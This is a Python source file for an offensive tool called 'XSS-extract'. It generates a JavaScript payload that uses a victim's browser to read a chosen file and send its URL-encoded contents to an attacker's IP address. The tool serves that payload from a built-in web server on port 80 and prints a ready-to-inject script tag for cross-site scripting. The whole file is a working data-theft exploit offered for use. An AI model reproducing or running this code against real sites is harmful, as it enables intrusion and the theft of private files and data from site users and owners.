#!/usr/bin/env python3

import os
import sys
import argparse
import http.server
import socketserver

PORT = 80
R = '\033[91m'
Y = '\033[93m'
S = '\033[0m'

JS_TEMPLATE = """
const path = "{file_path}";
const xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function () {{
    if (this.readyState == 4 && this.status == 200) {{
        const content = encodeURIComponent(this.responseText);
        const sendTo = "http://{ip}?content=" + content;
        const sendReq = new XMLHttpRequest();
        sendReq.open("GET", sendTo, true);
        sendReq.send();
    }}
}};

xhttp.open("GET", path, true);
xhttp.send();
"""

def generate_script(file_path, ip):
    return JS_TEMPLATE.format(file_path=file_path, ip=ip)

def server(file_path, ip):
    class MyHandler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            if self.path == '/exfil.js':
                self.send_response(200)
                self.send_header('Content-type', 'application/javascript')
                self.end_headers()
                with open('exfil.js', 'rb') as file:
                    self.wfile.write(file.read())
            else:
                self.send_response(404)
                self.end_headers()

    print(f'\nXSS payload: {Y}<script src=http://{ip}/exfil.js></script>{S}\n')
    print(f'File to extract: {Y}{file_path}{S}\n')

    with socketserver.TCPServer(('', PORT), MyHandler) as httpd:
        print(f'Serving at port {PORT}')
        httpd.serve_forever()

def ret_banner():
    banner = r"""
__  ______ ____                  _                  _
\ \/ / ___/ ___|        _____  _| |_ _ __ __ _  ___| |_
 \  /\___ \___ \ _____ / _ \ \/ / __| '__/ _` |/ __| __|
 /  \ ___) |__) |_____|  __/>  <| |_| | | (_| | (__| |_
/_/\_\____/____/       \___/_/\_\\__|_|  \__,_|\___|\__|
"""
    return banner

def main():

    parser = argparse.ArgumentParser(description='create exfil.js and serve it over http')
    parser.add_argument('-f', '--file', help='target file (full path)')
    parser.add_argument('-i', '--ip', help='attacker ip')

    args = parser.parse_args()

    if len(sys.argv) < 2:
        parser.print_help()
        sys.exit(1)

    js_code = generate_script(args.file, args.ip)

    with open('exfil.js', 'w') as file:
        file.write(js_code)

    print(ret_banner())

    try:
        server(args.file, args.ip)
    except KeyboardInterrupt:
        if os.path.isfile('exfil.js'):
            os.remove('exfil.js')
        print(f'\n{R}Exit{S}')
        sys.exit(1)
    except Exception as e:
        if os.path.isfile('exfil.js'):
            os.remove('exfil.js')
        print(f'\n{R}Error: {e}{S}')
        sys.exit(1)

if __name__ == '__main__':
    main()
